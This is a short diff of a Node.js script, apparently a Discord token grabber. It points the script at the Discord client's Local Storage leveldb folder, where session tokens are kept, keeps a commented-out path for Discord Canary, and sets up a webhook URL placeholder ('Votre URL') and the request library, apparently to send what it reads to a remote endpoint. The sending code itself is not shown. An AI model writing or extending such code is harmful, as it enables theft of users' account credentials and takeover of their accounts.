@@ -4,7 +4,13 @@ const { join } = require('path');
 const request = require('request');
 
 const WEBHOOK = "Votre URL";
-const path = join(homedir(), "AppData", "Roaming", "discordcanary", "Local Storage", "leveldb");
+
+//Discord
+const path = join(homedir(), "AppData", "Roaming", "discord", "Local Storage", "leveldb");
+
+/* Discord Canary
+const path2 = join(homedir(), "AppData", "Roaming", "discordcanary", "Local Storage", "leveldb");
+*/
 
 let [...files] = readdirSync(path);
 
